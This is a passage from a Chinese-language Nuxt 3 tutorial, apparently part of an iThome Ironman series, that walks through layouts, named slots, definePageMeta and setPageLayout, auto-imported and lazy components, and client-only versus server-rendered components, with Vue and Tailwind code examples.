Nuxt 3 提供了一個布局模板 (Layouts) 的功能，可以讓你定義好布局模板後，在整個 Nuxt 中使用，舉例來說就很適合如上方有導覽列，下方是網頁主體內容的這種排版方式，將其構建成一個布局模板後，我們就可以重複使用這種布局方式。\n布局模板通常放置在 ./layouts 目錄之下，也具有異步自動導入的效果，當新增好布局檔案後，我們就可以在 app.vue 中，添加 \u0026lt;NuxtLayout /\u0026gt; 元件來表示使用布局模板，也可以通過 name 設定不同的模板名稱。\n建立一個預設的布局模板 布局模板在 Nuxt 3 中有約定一個名稱為 default.vue 作為預設的模板，如果在頁面元件中未特別指定要使用哪個模板或 \u0026lt;NuxtLayout /\u0026gt; 沒有設定 name 屬性，那麼都將會使用 default 作為預設的布局。\nStep 1. 建立預設布局模板 新增 ./layouts/default.vue 檔案內容如下：\nlayouts/default.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-sky-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt;這是預設的布局，全部頁面都會使用到\u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在布局模板中，通常會包含一個 \u0026lt;slot /\u0026gt; 插槽，這個未命名的插槽 (slot) 即為預設插槽，這將會是採用這個布局模板的頁面元件，顯示的內容容器位置。\nStep 2. 添加 元件 調整 app.vue 檔案，內容如下，我們添加 \u0026lt;NuxtLayout\u0026gt; 作為布局模板顯示的位置，name 屬性預設是 default，不過我們還是寫上 name=\u0026quot;default\u0026quot; 避免誤會，這個 name 屬性值對應的即是布局模板的名稱。\n下圖可以看見，我們在 app.vue 所寫的文字「這裡是最外層 app.vue」，會是在最外層，而緊接著的 \u0026lt;NuxtLayout name=\u0026quot;default\u0026quot;\u0026gt;\u0026lt;/NuxtLayout\u0026gt;，就是布局頁面 default.vue。\n布局模板中的插槽 如果你有注意到，default.vue 檔案內程式碼內，有一個插槽 \u0026lt;slot /\u0026gt;，這裡就會是 \u0026lt;NuxtLayout\u0026gt; 內的元素所顯示的位置。\n例如，我們在 app.vue 稍作調整：\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;這裡是最外層 app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-slate-800\u0026#34;\u0026gt; 被 NuxtLayout 包裹的元件將會放置到 Layout 的 slot 中 \u0026lt;/p\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 被 \u0026lt;NuxtLayout name=\u0026quot;default\u0026quot;\u0026gt; 包裹的元素，就會在布局模板中的插槽 \u0026lt;slot /\u0026gt; 顯示。\n在布局模板中建立多個插槽 當然，你也可以在布局模板中添加多個插槽，並給予名稱，這樣就可以將內容安排到特定的位置。\nStep 1. 建立兩個具名的插槽 (Slot)，分別為 header 與 footer 如果插槽沒有給予 name 屬性，預設為 default。\nlayouts/default.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-sky-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt;這是預設的布局，全部頁面都會使用到\u0026lt;/p\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34; /\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. 將不同內容，顯示於指定的插槽位置。 app.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;這裡是最外層 app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-green-500\u0026#34;\u0026gt;這段會放置在 header 插槽\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-cyan-500\u0026#34;\u0026gt; 被 NuxtLayout 包裹的元件將會放置到 Layout 的預設 slot 中 \u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p class=\u0026#34;px-6 pt-4 text-xl text-blue-500\u0026#34;\u0026gt;這段會放置在 footer 插槽\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 下圖可以看見，我們就可以依此來安排各個元件，於布局模板插槽的所在位置。\n布局模板與路由頁面 當你熟悉了插槽配置，你也可以在其中添加 \u0026lt;NuxtPage /\u0026gt; 與建立 pages 下的頁面元件，以達到不同的路由頁面，使用相同的布局方式。\n如果布局模板結合了路由頁面，整體網站就會如下的巢狀顯示方式，網站的入口點 app.vue 放置布局模板，模板內的內容則使用路由的 \u0026lt;NuxtPage /\u0026gt;，最後各個路由的頁面就會在 \u0026lt;NuxtPage /\u0026gt; 容器中顯示。\n1 2 3 4 5 6 7 8 9 10 11 +---------------------------+ | app.vue | | +-----------------------+ | | | layout | | | | +-------------------+ | | | | | page | | | | | | | | | | | | | | | | | +-------------------+ | | | +-----------------------+ | +---------------------------+ 建立布局模板與路由頁面 Step 1. 調整 app.vue 入口點 將 app.vue 調整為以下內容：\napp.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-4 bg-white\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;pb-4 text-2xl text-slate-600\u0026#34;\u0026gt;這裡是最外層 app.vue\u0026lt;/p\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. 建立路由頁面 建立 ./pages/index.vue，內容如下：\npages/index.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-6 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 這樣我們就可以來讓路由頁面共用相同的布局模板。\n多個路由頁面共用預設布局模板 承上，我們建立好預設的布局模板，讓它負責顯示路由的頁面。\nStep 1. 新增路由頁面 新增 ./pages/about.vue，內容如下：\npages/about.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-yellow-400\u0026#34;\u0026gt;大家好！我是 Ryan\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;這裡是 /about\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 新增 ./pages/contact.vue，內容如下：\npages/contact.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-rose-400\u0026#34;\u0026gt;如果沒事不要找我 xDDD\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;這裡是 /contact\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. 新增路由連結 調整 ./pages/index.vue，內容如下：\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;這裡是首頁\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/about\u0026#34;\u0026gt;前往 About\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/contact\u0026#34;\u0026gt;前往 Contact\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 可以發現，現在首頁 /、/about 與 /contact 都套用上了預設布局。\n建立多個布局模板 你也可以建立多個布局模板，再依據不同的情境，使用不同的布局模板。\nStep 1. 建立新的布局模板 新增 ./layouts/custom.vue，內容如下：\nlayouts/custom.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-rose-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt; 使用 \u0026lt;span class=\u0026#34;font-bold text-rose-500\u0026#34;\u0026gt;Custom\u0026lt;/span\u0026gt; 布局 \u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 2. 新增一個路由頁面 新增 ./pages/custom.vue，內容如下：\npages/custom.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;m-6 bg-slate-50 py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Step 3. 使用指定布局模板 在 ./pages/custom.vue 中的 script 使用 definePageMeta 方法：\n1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ layout: \u0026#39;custom\u0026#39; }) \u0026lt;/script\u0026gt; definePageMeta 方法，提供我們可以設定特定的布局模板，layout 參數值所對應的名稱，即為 ./layouts 目錄下的布局模板。\n注意，布局模板的命名被規範使用 Kebab Case 命名法，若檔案名稱為 customLayout.vue，它將會以 custom-layout 作為 name 屬性傳遞給\n更進階的指定布局模板 我們能使用 layout: false 來禁止使用預設的布局模板，並在 template 添加 \u0026lt;NuxtLayout name=\u0026quot;custom\u0026quot;\u0026gt; 來使用 custom 布局模板。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;custom\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; 當布局模板可以在 template 中設定使用，我們就能結合插槽甚至動態的調整 name 屬性，做出更多樣靈活的布局效果。\n上圖的參考程式碼：\nlayouts/custom.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-rose-100 py-2\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;px-6 py-4 text-2xl text-gray-700\u0026#34;\u0026gt; 使用 \u0026lt;span class=\u0026#34;font-bold text-rose-500\u0026#34;\u0026gt;Custom\u0026lt;/span\u0026gt; 布局 \u0026lt;/p\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/custom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout name=\u0026#34;custom\u0026#34;\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;div class=\u0026#34;mx-6 mb-4 bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-xl text-slate-600\u0026#34;\u0026gt;感謝您閱讀 Nuxe 3 學習筆記～\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; definePageMeta({ layout: false }) \u0026lt;/script\u0026gt; 當你使用 definePageMeta 方法，禁止使用預設的布局模板後，你也能使用 setPageLayout 方法來動態改變布局。\n例如：\n1 2 3 4 5 \u0026lt;script setup\u0026gt; const = enableCustomLayout () =\u0026gt; { setPageLayout(\u0026#39;custom\u0026#39;) } \u0026lt;/script\u0026gt; 當你看過了這篇內容後，你會發現 Nuxt 3 所提供的布局模板非常的好用，布局模板規劃好後，爾後頁面所使用到的相同布局，只需要更改同一個布局模板，如果再結合元件化技巧，更是讓你的程式碼兼具重複使用性與維護性。\n元件 (Components) 在建立 Vue 的網站開發過程中，我們可能會自己封裝元件 (Component) 讓程式碼可以被重複使用，也方便開發者維護，這些一個個的元件，可以透過全域註冊 (Global Registration) 讓整個 Vue 應用程式中都可以使用這個元件，也可以透過區域註冊 (Local Registration) 於特定的元件再載入使用。接下來我們將介紹 Nuxt 3 使用元件時應該遵循的規範及特色。\n元件自動載入 在 Vue 中，雖然區域註冊使得元件間的依賴關係更加明確也對於 Tree shaking 更加友好，但我們在使用元件時，就得在需要的地方個別載入及註冊。而 Nuxt 3 提供在 components 目錄下專門放至這些元件，並具有自動載入及延遲載入等功能特色。\n建立與使用元件 新增 ./components/IronManWelcome.vue，內容如下：\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 調整 ./app.vue，內容如下：\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 當我們建立了 ./components/IronManWelcome.vue 檔案後，Nuxt 會自動載入 ./components 目錄中的任何元件，在使用時的元件名稱也對應著檔案名稱，所以我們只需直接添加 \u0026lt;IronManWelcome /\u0026gt; 就可以直些使用這個元件。\n元件名稱 Nuxt 所自動載入 ./components 目錄下的元件，在使用時的元件名稱也對應著檔案名稱，而當你在巢狀的目錄結構下的元件，元件的名稱將會基於目錄的路徑與檔案名稱，並刪除重複的字段。\n舉例來說，如果 ./components 目錄結構如下：\n1 2 3 4 components/ └── base/ └── apply/ └── Button.vue ./components/base/apply/Button.vue 元件的名稱就會是由目錄與檔案名稱組合出的 \u0026lt;BaseApplyButton\u0026gt;。\n為了開發上能更清楚辨別，建議將檔案名稱設置與使用元件時的名稱相同，所以我們重新命名 ./components/base/apply/ 下的 Button.vue 為 BaseApplyButton.vue。\n1 2 3 4 components/ └── base/ └── apply/ └── BaseApplyButton.vue 你也不用擔心元件名稱會不會變成 \u0026lt;BaseApplyBaseApplyButton\u0026gt; 看起來有點醜醜的，因為 Nuxt 會幫我們刪除重複的字段，所以在使用時元件名稱為 \u0026lt;BaseApplyButton\u0026gt;。\n元件名稱的命名規則 Vue 在註冊元件時，可以使用大駝峰式命名法 (Pascal Case) 或烤肉串命名法 (Kebab Case) 來為元件命名，並在 template 也可以自由使用兩種命名方式作為使用元件的標籤。\n例如，以 \u0026lt;base-apply-button\u0026gt; 來表示使用 ./components/base/apply/BaseApplyButton.vue 元件。\n抑或建立 ./components/base/apply/base-apply-button.vue 元件，使用時以 \u0026lt;BaseApplyButton\u0026gt; 表示。\n兩種方式 Nuxt 都支援，可以根據自己的習慣做選擇，而我個人是以大駝峰式命名法 (Pascal Case) 為主，以此區別為自己建立的元件。\n動態元件 (Dynamic Components) 如果想要使用像 Vue 中的 \u0026lt;component :is=\u0026quot;someComputedComponent\u0026quot;\u0026gt; 來動態的切換不同的元件，則需要使用 Vue 提供的 resolveComponentVue 方法來進行輔助。\n例如：\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;component :is=\u0026#34;show ? DynamicComponent : \u0026#39;div\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const show = ref(false) const DynamicComponent = resolveComponent(\u0026#39;BaseApplyButton\u0026#39;) \u0026lt;/script\u0026gt; 建立動態元件 Step 1. 建立元件 新增 ./components/base/apply/BaseApplyButton.vue，內容如下：\ncomponents/base/apply/BaseApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; 立即報名 \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 新增 ./components/round/apply/RoundApplyButton.vue，內容如下：\ncomponents/round/apply/RoundApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 rounded-full bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; 立即報名 \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; Step 2. 使用 resolveComponent() 調整 ./app.vue，內容如下：\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex items-center\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;show-button\u0026#34; v-model=\u0026#34;useRound\u0026#34; name=\u0026#34;show-button\u0026#34; type=\u0026#34;checkbox\u0026#34; class=\u0026#34;h-5 w-5\u0026#34; /\u0026gt; \u0026lt;label for=\u0026#34;show-button\u0026#34; class=\u0026#34;ml-2 block text-base text-slate-800\u0026#34;\u0026gt;使用圓角按鈕\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;component :is=\u0026#34;useRound ? RoundButton : BaseButton\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const useRound = ref(false) const BaseButton = resolveComponent(\u0026#39;BaseApplyButton\u0026#39;) const RoundButton = resolveComponent(\u0026#39;RoundApplyButton\u0026#39;) \u0026lt;/script\u0026gt; 呈現效果：\n動態載入 (Dynamic Imports) 動態載入 (Dynamic Imports) 元件也稱之為延遲載入 (lazy-loading)，如果頁面中不需要立刻使用或顯示某個元件，透過動態載入的方式可以延遲元件載入的時間點，有助於優化 JavaScript 首次載入時的檔案大小。\n使用的方式也非常簡單，只需要在使用元件時，加上前綴 Lazy 就可以有延遲載入的效果。\n建立一個動態載入的按鈕 Step 1. 建立按鈕元件 新增 ./components/base/apply/BaseApplyButton.vue，內容如下：\ncomponents/base/apply/BaseApplyButton.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;mt-6 rounded-sm bg-blue-600 py-3 px-8 text-xl font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; \u0026gt; 立即報名 \u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; Step 2. 添加 Lazy 前綴 調整 ./app.vue，內容如下：\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex items-center\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;show-button\u0026#34; v-model=\u0026#34;show\u0026#34; name=\u0026#34;show-button\u0026#34; type=\u0026#34;checkbox\u0026#34; class=\u0026#34;h-5 w-5\u0026#34; /\u0026gt; \u0026lt;label for=\u0026#34;show-button\u0026#34; class=\u0026#34;ml-2 block text-base text-slate-800\u0026#34;\u0026gt;顯示報名按鈕\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;LazyBaseApplyButton v-if=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const show = ref(false) \u0026lt;/script\u0026gt; 看看延遲載入的效果：\n在頁面上有一個核取方塊，使用者勾選時才顯示按鈕，我們透過瀏覽器的開發者工具觀察網路 (Network) 的使用情況，可以發現只有首次勾選後才請求了 BaseApplyButton.vue 按鈕元件 JS。當這個按鈕元件被設置為 Lazy 動態載入時，頁面首次載入其實不會包含這個按鈕的程式碼，而是等待需要這個元件時才去請求下載，以此達到延遲載入的效果，同時也降低首次進入網頁時需要下載的 JavaScript 程式碼大小。\n控制伺服器端或客戶端渲染元件 \u0026lt;ClientOnly\u0026gt; 元件 Nuxt 3 提供了一個 \u0026lt;ClientOnly\u0026gt; 元件，可以控制被包裹的元件僅在客戶端進行渲染。\n例如，我們建立 ./components/IronManWelcome.vue 檔案，內容如下：\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 使用 \u0026lt;ClientOnly\u0026gt; 元件包裹 \u0026lt;IronManWelcome\u0026gt;。\n調整 ./app.vue 中，內容如下：\napp.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 這樣就可以將 \u0026lt;IronManWelcome\u0026gt; 元件設定為僅在客戶端進行渲染，首次請求頁面時將不會包含這個元件的 HTML。\n\u0026lt;ClientOnly\u0026gt; 元件中提供了一個名為 fallback 的插槽 (Slot)，可以用作於在伺服器渲染的預設內容，等到客戶端載入完成才接手渲染被包裹的 \u0026lt;IronManWelcome\u0026gt; 元件。\n調整 ./app.vue 中，內容如下：\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ClientOnly\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;template #fallback\u0026gt; \u0026lt;p class=\u0026#34;my-6 flex justify-center\u0026#34;\u0026gt;[IronManWelcome] 載入中...\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/ClientOnly\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 當進入首次網頁，會先渲染 fallback 插槽內的元素，所以瀏覽器先顯示 [IronManWelcome] 載入中\u0026hellip; 文字，接著客戶端載入完 JS 後接手渲染 \u0026lt;IronManWelcome\u0026gt; 元件。\n你也可以透過瀏覽器頁面中點擊右鍵後展開選單的「檢視網頁原始碼」功能，所看到的網頁原始碼，發現伺服器端僅先回應了 \u0026lt;p class=\u0026quot;my-6 flex justify-center\u0026quot;\u0026gt;[IronManWelcome] 載入中...\u0026lt;/p\u0026gt;，表示這是由伺服器端渲染 \u0026lt;ClientOnly\u0026gt; 元件 fallback 插槽的內容。\n.client 與 .server Nuxt 3 的元件，也可以透過元件的檔案名稱來控制僅顯示在客戶端或伺服器端。\n如果元件僅在客戶端呈現，則可以將 .client 加入元件檔名的後綴中。\n建立一個 ./components/JustClient.client.vue 元件檔案，表示 \u0026lt;JustClient\u0026gt; 元件，僅會在客戶端進行渲染。\n而添加 .server 後綴的元件檔案，則會是這個元件在伺服器端渲染的內容。\n控制伺服器端或客戶端渲染元件範例 我們使用 \u0026lt;ClientOnly\u0026gt; 元件、.client 與 .server 做一個範例來看呈現的效果。\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/JustClient.client.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-green-100 p-4 text-sm text-green-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[JustClient]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt;這是只有在 \u0026lt;span class=\u0026#34;font-bold\u0026#34;\u0026gt;Client\u0026lt;/span\u0026gt; 才會渲染的元件\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/ClientAndServer.client.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-sky-100 p-4 text-sm text-sky-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[ClientAndServer]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt; 這是從 \u0026lt;span class=\u0026#34;font-bold text-red-500\u0026#34;\u0026gt;Client\u0026lt;/span\u0026gt; 渲染出來的元件 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; components/ClientAndServer.server.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;mx-16 my-4 rounded-lg bg-sky-100 p-4 text-sm text-sky-700\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;font-semibold\u0026#34;\u0026gt;[ClientAndServer]\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;ml-2\u0026#34;\u0026gt; 這是從 \u0026lt;span class=\u0026#34;font-bold text-red-500\u0026#34;\u0026gt;Server\u0026lt;/span\u0026gt; 渲染出來的元件，請等待 Client 接手渲染 \u0026lt;/span\u0026gt; 